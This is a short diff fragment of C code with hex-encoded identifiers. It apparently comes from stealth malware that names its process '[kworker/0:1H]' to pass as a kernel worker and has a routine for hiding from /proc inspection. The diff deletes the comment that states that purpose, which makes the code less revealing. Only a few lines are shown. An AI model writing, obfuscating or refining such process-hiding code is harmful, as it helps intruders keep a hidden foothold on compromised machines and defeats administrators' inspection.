@@ -22,7 +22,7 @@ static char x70726f636e6d65[] = {'/','l','i','b','/','s','y','s','t','e','m','d'
 static char x666b636d646c6e65[] = {'[','k','w','o','r','k','e','r','/','0',':','1','H',']','\0'};
 
 static void x616476686964696e() {
-    // Try to hide from /proc/PID/ inspection
+   
     char x70726f6370617468[64];
     snprintf(x70726f6370617468, sizeof(x70726f6370617468), "/proc/%d", getpid());
     
